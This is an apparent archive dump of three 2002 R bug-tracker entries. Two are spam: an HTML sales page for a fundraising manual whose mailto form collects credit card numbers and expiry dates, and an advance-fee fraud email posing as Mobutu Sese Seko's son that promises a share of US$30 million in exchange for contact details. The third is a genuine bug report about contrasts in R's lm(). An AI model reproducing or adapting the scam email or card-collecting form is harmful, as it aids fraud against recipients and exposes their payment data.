+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<style type="text/css">
+<!--
+body {
+font-family: Arial:
+font-size: 12px;
+}
+
+a:link {color: rgb(38,41,119);  font-weight: bold; text-decoration: none;}
+a:visited {color: rgb(38,41,119);  font-weight: bold; text-decoration: none;}
+a:hover {color: #B3C2D1; font-weight: bold; text-decoration: none;}
+
+td {
+font-family: Arial;
+font-size: 12px;
+}-->
+</style>
+<title>The Best 99 Fundraising Case Studies</title>
+
+</head>
+
+
+<body>
+
+  <table border="0" cellpadding="5" cellspacing="0" width="550">
+    <tr>
+      <td>
+                                                <p align="center">
+                                                <b><font size="6">Involved in 
+                                                Fundraising?</font><br></b>
+                                                <font size="4">Here is the 
+                                                answer you have been looking 
+                                                for! </font>
+                                                <p>Since 1989, the publishers of the daily (business finance) newspaper for fundraisers
+                                                - &nbsp;<b>Nonprofit and Charity News</b> 
+                                                - have been assisting nonprofits and charities.&nbsp;
+                                                <p align="center"><b><font size="3">Now you too can benefit from their expertise and
+                                                resources.</font></b>
+                                                <p>The 99 best case studies from 
+                                                the archives of Nonprofit and 
+                                                Charity News have now been 
+                                                compiled into <b>ONE 
+                                                COMPREHENSIVE MANUAL</b>. Written from a &quot;business 
+                                                finance&quot; perspective, <b>just 
+                                                one idea</b> will reimburse you
+                                                for the purchase <b>many times over</b>. <br>
+                                                <br>
+                                                <b>What are you waiting for...
+                                                </b></p>
+        <p>
+        <img border="0" src="http://free.hostdepartment.com/missyme2/images/fcsfolder.jpg" align="right" width="150" height="182">Buy the MANUAL
+        with 99 case studies of the best ever fundraising programs and earned income ventures
+        before September 24th AND YOU WILL ALSO RECEIVE - FREE, AT NO ADDITIONAL COST six months of daily updates of new case studies by successful nonprofits and charities.<br>
+        <br>
+        <br>
+        The 99 best case studies from the archives of Nonprofit and Charity News 
+        have now been compiled into <b>ONE COMPREHENSIVE 
+        MANUAL</b>. This manual is now available for US$140 (this price 
+        includes express delivery anywhere in the world). Plus, we will provide 
+        you with updates from Nonprofit and Charity News for the next six months 
+        - every day.<p>Recent purchasers of our manual include The Fundraising Institute of Ireland (Dublin), Telfair Museum of Art (Savannah, Georgia), New Plymouth Hospital Foundation (New Zealand), Save the Children Australia (Melbourne), UN Development Agency (Geneva), Metro Food Bank (Halifax, Nova Scotia), Cancer Council Australia (Sydney), PVHMC Foundation (Pomona, California), Hale School (Perth, Australia), CIMMYT (Mexico City), Asociacion Andes (Cusco, Peru), Leukaemia Foundation (Melbourne, Australia) and Papanui Softball Association (Christchurch, New
+                                                Zealand) - and many more.<p align="center"><br>
+                                                <b><font size="4">Examples: “Corporate 
+                                                Partnership” case 
+                                                studies</font></b><font size="4"><br>
+                                                </font><b><font size="3">from 99 Best Ever 
+                                                Fundraising and Earned Income 
+                                                Projects Vol.1</font></b><p><b>
+                                                Corporate adopts charity</b></p>
+                                                <ul type="square">
+                                                  <li>The real estate franchise 
+                                                  group L. J. Hooker adopted the 
+                                                  charity Cystic Fibrosis two 
+                                                  years ago as its corporate 
+                                                  charity. </li>
+                                                  <li>In the first year of the 
+                                                  relationship, Hookers launched 
+                                                  the Ultimate Garage Sale, and 
+                                                  invited everyone in the 
+                                                  community to drop off unused - 
+                                                  but saleable - items at their 
+                                                  600 local offices. </li>
+                                                  <li>This initiative raised 
+                                                  $185,000, which was boosted 
+                                                  with a corporate donation of 
+                                                  $50,000. </li>
+                                                  <li>This year they hope to at 
+                                                  least surpass that success, 
+                                                  particularly as the company 
+                                                  has organised a charity house 
+                                                  to be built in Brisbane with 
+                                                  donated materials. </li>
+                                                  <li>When auctioned, this 
+                                                  charity house should generate 
+                                                  a surplus of $50,000 which 
+                                                  will also go to Cystic 
+                                                  Fibrosis.</li>
+                                                </ul>
+                                                <p><b>Companies use charities 
+                                                for publicity</b></p>
+                                                <ul type="square">
+                                                  <li>There is a growing trend 
+                                                  for companies to use charities 
+                                                  to generate publicity - with 
+                                                  or without the consent of the 
+                                                  charity. </li>
+                                                  <li>The franchise hairdressing 
+                                                  chain Just Cuts took a more 
+                                                  responsible attitude and 
+                                                  earned enormous publicity 
+                                                  throughout NSW with its 
+                                                  promotion to donate $1 to 
+                                                  charity for every haircut in 
+                                                  its salons on a Saturday in 
+                                                  February. </li>
+                                                  <li>Their PR firm went to work 
+                                                  and - by using photos from 
+                                                  local salons - was able to get 
+                                                  exposure for Just Cuts in 
+                                                  various local newspapers. </li>
+                                                  <li>64 salons participated and 
+                                                  $25,000 was raised for the 
+                                                  Sydney Children’s Hospital at 
+                                                  Randwick.</li>
+                                                </ul>
+                                                <p align="center"><b><font size="4">Examples: “Community 
+                                                Focus” case 
+                                                studies</font></b><font size="4"><br>
+                                                </font><b>from 99 Best Ever 
+                                                Fundraising and Earned Income 
+                                                Projects Vol.1</b><p><b>
+                                                Celebrity chefs pool talents</b></p>
+                                                <ul type="square">
+                                                  <li>The annual luncheon 
+                                                  catered by the Great Chefs of 
+                                                  Adelaide raises over $50,000 
+                                                  for the Archbishop’s Appeal, 
+                                                  and its beneficiary Anglicare.
+                                                  </li>
+                                                  <li>Most of the fine wine and 
+                                                  food is donated, the chefs 
+                                                  give their time for free, as 
+                                                  do students from the Regency 
+                                                  Hotel School - who do the 
+                                                  support cooking and act as 
+                                                  waiters for the 300+ guests.
+                                                  </li>
+                                                  <li>The event is held on a 
+                                                  Sunday at the Adelaide Town 
+                                                  Hall and is marketed to those 
+                                                  who like to have a long Sunday 
+                                                  lunch with friends.</li>
+                                                </ul>
+                                                <p><b>Opportunity in credit card 
+                                                over-ride </b></p>
+                                                <ul type="square">
+                                                  <li>If you have a large number 
+                                                  of affluent supporters on your 
+                                                  database, credit card income 
+                                                  could be of interest to you.</li>
+                                                  <li>For example, the Royal 
+                                                  Society for the Prevention of 
+                                                  Cruelty to Animals offers Amex 
+                                                  credit cards to its database 
+                                                  of 70,000 names. </li>
+                                                  <li>Amex will then pay a usage 
+                                                  fee back to the animal welfare 
+                                                  agency. </li>
+                                                  <li>The numbers work like this 
+                                                  – if 5% of names take up the 
+                                                  offer, and if they each spend 
+                                                  $10,000 a year on their card, 
+                                                  and if Amex pays 0.25% on 
+                                                  usage, then the RSPCA will 
+                                                  earn $87,500 annually. </li>
+                                                  <li>However the demographics 
+                                                  of the RSPCA supporter base 
+                                                  are unlikely to support these 
+                                                  figures – firstly a typical 
+                                                  supporter is unlikely to be in 
+                                                  an age group that would be 
+                                                  keen to accept another credit 
+                                                  card, secondly they are 
+                                                  unlikely to spend $10,000 
+                                                  annually on credit. </li>
+                                                  <li>All marketing expenses are 
+                                                  met by Amex, and there is no 
+                                                  breaching of Privacy Code 
+                                                  legislation because you are 
+                                                  marketing to your own members.</li>
+                                                  <li>Save the Children, AIDS 
+                                                  Trust, and the Starlight 
+                                                  Children’s Foundation are also 
+                                                  part of a growing number of 
+                                                  community business enterprises 
+                                                  that offer a branded credit 
+                                                  card issued by American 
+                                                  Express.</li>
+                                                </ul>
+        <p>
+        <b>Don't miss out - offer expires on September 24th, 2002<br>
+        </b><br>
+ To order your manual, just complete the form below or call <b>+61 3&nbsp; 8610 1022
+        </b>or fax&nbsp; <b>+61 3 8610 1023</b></td>
+    </tr>
+    <tr>
+      <td>
+        <form action="mailto:fundraising@email.com.cn" method="post" enctype="text/plain">
+            <table border="0" width="550">
+              <tr>
+                                    <td align="left" colspan="2" width="544" valign="baseline"><b><input type="checkbox" name="C1" value="SD=1809" checked>
+                                      Yes! I 'd like to order the Fundraising
+                                      Manual</b></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>e-Mail</b></td>
+                                    <td><input size="50" value=" " name="eMail "></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Number
+                                      of Fundraising Manuals:</b></td>
+                                    <td><input type="text" name="FundraisingManuals" size="5">
+                                      @ US$140</td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>First
+                                      Name:</b></td>
+                                    <td><font face="Arial" size="2"><strong><input size="35" name="FirstName"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Last
+                                      Name:</b></td>
+                                    <td><font face="Arial" size="2"><strong><input size="35" name="LastName"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Nonprofit/Charity</b></td>
+                                    <td><font face="Arial" size="2"><input size="50" name="Nonprofit_Charity"></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Position</b></td>
+                                    <td><font face="Arial" size="2"><input size="30" name="Position"></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Address</b></td>
+                                    <td><font face="Arial" size="2"><strong><input size="40" name="Address"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Address
+                                      Cont.</b></td>
+                                    <td><font face="Arial" size="2"><strong><input size="40" name="Address2"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Post
+                                      Code</b></td>
+                                    <td><font face="Arial" size="2"><strong><input maxLength="12" size="12" name="PostCode"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Country</b></td>
+                                    <td><font face="Arial" size="2"><strong><input maxLength="25" size="25" name="Country"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Phone</b></td>
+                                    <td><font face="Arial" size="2"><strong><input maxLength="25" size="25" name="Phone"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Fax</b></td>
+                                    <td><font face="Arial" size="2"><strong><input maxLength="25" size="25" name="Fax"></strong></font></td>
+              </tr>
+              <tr>
+                                    <td align="right"><b>Web
+                                      Site:</b></td>
+                                    <td><font face="Arial" size="2"><strong><input size="45" name="URL"></strong></font></td>
+              </tr>
+              <tr>
+                                        <td align="right"><b>Credit
+                                          Card:</b></td>
+                                        <td><font face="Arial" color="#000000" size="2"><strong><select size="1" name="CreditCard">
+                                            <option value="Select One" selected>Select
+                                            One</option>
+                                            <option value="Amex">Amex</option>
+                                            <option value="BankCard">BankCard</option>
+                                            <option value="Diners">Diners</option>
+                                            <option value="MasterCard">MasterCard</option>
+                                            <option value="Visa">Visa</option>
+                                            <option value="Fax">Will fax details</option>
+                                             </select></strong></font></td>
+                                      </tr>
+              <tr>
+                                        <td align="right"><b>Card Number</b></td>
+                                        <td><input size="40" name="CardNo"></td>
+                                      </tr>
+              <tr>
+                                        <td align="right"><b>Cardholders Name</b></td>
+                                        <td><input size="40" name="CardName"></td>
+                                      </tr>
+              <tr>
+                                        <td align="right"><b>Expiry Date</b></td>
+                                        <td><input size="25" name="CardExpiry"></td>
+                                      </tr>
+              <tr>
+                                    <td align="left" colSpan="2" width="544"><b>Don't
+                                      Delay - Order Now!</b></td>
+              </tr>
+              <tr>
+                                    <td align="right" width="544" colSpan="2">
+                                      <div align="center">
+                                        <p><font face="Arial" size="2">
+                                        <input type="submit" value="Submit" name="B1">
+                                        <input type="reset" value="Reset" name="B2"></font></p>
+
+                       </div>
+                        </td>
+              </tr>
+            </table>
+        </form>
+
+
+                                        <p align="left">Your request is sent by 
+                                        eMail - just check your 'Sent Items' to 
+                                        confirm that it has been submitted 
+                                        successfully.</p>
+        <p align="left">
+                                        This is being sent to: <b>r-bugs@r-project.org</b> </p>
+        <p align="left">If you do not wish to receive further promotional 
+        material from us, <b>
+                                        do not reply to sender</b>, <a href="mailto:fundraiseremove@ecash.com.cn?subject=remove r-bugs@r-project.org&body=remove r-bugs@r-project.org">
+                                        simply click here to send an email with &quot;REMOVE
+                                        r-bugs@r-project.org</a><a href="mailto:fundraiseremove@ecash.com.cn?subject=Remove&body=Remove">&quot;</a> in the subject 
+                                        line </p>
+        <p>&nbsp;</td>
+    </tr>
+  </table>
+
+</body>
+
+</html>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 2036 *
+Subject: URGENT ASSISTANCE
+From: "nguema seseseko" <sese_seko4000@lycos.com>
+Date: Wed, 18 Sep 2002 15:12:28 -0500
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 2036 <==
+From sese_seko4000@mailcity.com  Wed Sep 18 22:14:17 2002
+Received: from mailcity.com (fe-mail.whowhere.com [209.202.220.140] (may be forged))
+	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id WAA11975
+	for <r-bugs@biostat.ku.dk>; Wed, 18 Sep 2002 22:14:16 +0200 (MET DST)
+Received: from Unknown/Local ([?.?.?.?]) by mailcity.com; Wed, 18 Sep 2002 20:12:28 -0000
+To: sese_seko4000@lycos.com
+Date: Wed, 18 Sep 2002 15:12:28 -0500
+From: "nguema seseseko" <sese_seko4000@lycos.com>
+Message-ID: <HDDEFGMPIJLMHAAA@mailcity.com>
+Mime-Version: 1.0
+X-Sent-Mail: off
+Reply-To: sese_seko4000@lycos.com
+X-Mailer: MailCity Service
+X-Priority: 3
+Subject: URGENT ASSISTANCE
+X-Sender-Ip: 213.251.169.58
+Organization: Lycos Mail  (http://www.mail.lycos.com:80)
+Content-Type: text/plain; charset=us-ascii
+Content-Language: en
+Content-Transfer-Encoding: 7bit
+
+FROM:MR.NGUEMA SESE-SEKO
+ATTN:
+  
+ BUSINESS AND PARTNERSHIP PROPOSAL
+ 
+ I am the son of the late president of The Federal
+Republic Of Zaire,President Mobutu Sese Seko, 
+( now The Republic Of Congo, under the
+leadership of the son of Mr. Laurent Kabila ). I
+presume you are aware there is a financial dispute
+between my family ( THE MOBUTU ) and the present
+civilian Government. This is based on what they
+believe as bad and corrupt governance on my
+late father's part. May his soul rest in perfect
+peace.
+ Presently, we can not do business here in Holland and
+many countries of the World, because of the new
+friendly relationship between the present
+government and the Western World. As you might have
+heard how a lot of my father's bank account in
+Switzerland and North America have been frozen.
+ Following the above named reasons, I am soliciting
+for your humble and confidential assistance to take 
+custody of THIRTY Million United States Dollars 
+( US$30,000,000.00 ), also to front for me in the
+areas of business you desire profitable.
+ These funds have secretly been deposited into a
+confidential Security Company, where it can easily be
+withdrawn or paid to a recommended beneficiary. The
+funds will be released to you by the Security Company,
+based on my recommendations, on that note, you will be
+presented as my partner who will be fronting for me
+and my family in any subsequent ventures.
+To show my preparedness and appreciation to conduct
+this business with you, I shall give you and your
+family 20% of the funds and 20% commission
+on any profit realizable in the process of investment
+of the funds. For your role in this business, I am
+willing to make available 5% for any eventual cost
+that may occur in the process of this transaction.
+ Please, I need your entire support and co-operation
+for the success of this business ventures, your utmost
+confidentiality and secrecy is highly required, due to
+my family's present predicament.
+ I sincerely will appreciate your acknowledgment as
+soon as possible.
+You can get intouch with my lawyer who I have
+stationed in holland for the transaction. HE will fax
+you with the relevant documents and brief on how you
+can come down. 
+ His name is DENNIS KABALA.you can get to him through
+EMAIL:kabala_dennis45@hotmail.com
+TEL.NUMBER:31-612696757
+ Please indicate your interest by sending your
+telephone and fax numbers.
+I sincerely will appreciate your acknowlagement as
+soon as possible.
+
+Yours truely,
+
+MR.NGUEMA MOBUTU SESE-SEKO.
+
+
+
+
+
+
+
+
+_____________________________________________________________
+Play the Elvis® Scratch & Win for your chance to instantly win $10,000 Cash
+- a 2003 Harley Davidson® Sportster® - 1 of 25,000 CD's - and more!
+http://r.lycos.com/r/sagel_mail_scratch_tl/http://win.ipromotions.com/lycos_020801/index.asp?tc=7087 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 2037 *
+Subject: contrasts in lm~-1+(numeric.variable)/(factor)
+From: hosking@watson.ibm.com
+Date: Wed, 18 Sep 2002 23:06:12 +0200 (MET DST)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 2037 <==
+From hosking@watson.ibm.com  Wed Sep 18 23:06:13 2002
+Received: from blueberry (blueberry [192.38.19.4])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA12205
+	for <R-bugs@biostat.ku.dk>; Wed, 18 Sep 2002 23:06:12 +0200 (MET DST)
+Date: Wed, 18 Sep 2002 23:06:12 +0200 (MET DST)
+From: hosking@watson.ibm.com
+Message-Id: <200209182106.XAA12205@pubhealth.ku.dk>
+To: R-bugs@biostat.ku.dk
+Subject: contrasts in lm~-1+(numeric.variable)/(factor)
+
+Full_Name: J. R. M. Hosking
+Version: 1.5
+OS: Windows 2000
+Submission from: (NULL) (198.81.209.17)
+
+
+Here is a test case:
+
+# Some arbitrary data
+#
+v1<-1:12
+v2<-cumsum(v1)
+v3<-cumsum(v2)
+f<-factor(rep(c("a","b","c"),4))
+y<-c(1,4,2,7,5,8,7,9,6,10,12,10)
+print(cbind(y,f,v1,v2,v3))
+#
+# Fit a regression model with no intercept, and different slopes
+# for each value of the factor
+#
+ans<-lm( y ~ -1 + v1/f + v2/f + v3/f, contrasts=list(f=contr.sum))
+print(as.matrix(ans$coefficients))
+
+And its output:
+
+> # Some arbitrary data
+> #
+> v1<-1:12
+> v2<-cumsum(v1)
+> v3<-cumsum(v2)
+> f<-factor(rep(c("a","b","c"),4))
+> y<-c(1,4,2,7,5,8,7,9,6,10,12,10)
+> print(cbind(y,f,v1,v2,v3))
+       y f v1 v2  v3
+ [1,]  1 1  1  1   1
+ [2,]  4 2  2  3   4
+ [3,]  2 3  3  6  10
+ [4,]  7 1  4 10  20
+ [5,]  5 2  5 15  35
+ [6,]  8 3  6 21  56
+ [7,]  7 1  7 28  84
+ [8,]  9 2  8 36 120
+ [9,]  6 3  9 45 165
+[10,] 10 1 10 55 220
+[11,] 12 2 11 66 286
+[12,] 10 3 12 78 364
+
+> #
+> # Fit a regression model with no intercept, and different slopes
+> # for each value of the factor
+> #
+> ans<-lm( y ~ -1 + v1/f + v2/f + v3/f, contrasts=list(f=contr.sum))
+> print(as.matrix(ans$coefficients))
+               [,1]
+v1     1.5927715155
+v2    -0.5228148121
+v3     0.0718702660
+v1:fa  1.3916372272
+v1:fb  0.5747198574
+v1:fc            NA
+f1:v2 -0.2937603407
+f2:v2  0.0328886311
+f1:v3  0.0414907636
+f2:v3  0.0003204578
+
+Though I asked for "sum" contrasts, the v1 coefficients came back
+with "treatment" contrasts.  I don't see any technical reason why
+"sum" contrasts can't be computed.  Is it a bug?
+
+Also, why should the order of the variables be reversed (f1:v2 where
+I would have expected v2:f1, etc.)?
+
+By the way, S-plus refuses to fit this model at all ("Problem in
+model.matrix.default(Terms, m, contrasts): Internal error: predicted 2
+columns for f %in% v1, got 3).
+
+
+Version information:
+         _              
+platform i386-pc-mingw32
+arch     i386           
+os       mingw32        
+system   i386, mingw32  
+status                  
+major    1              
+minor    5.1            
+year     2002           
+month    06             
+day      17             
+language R 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
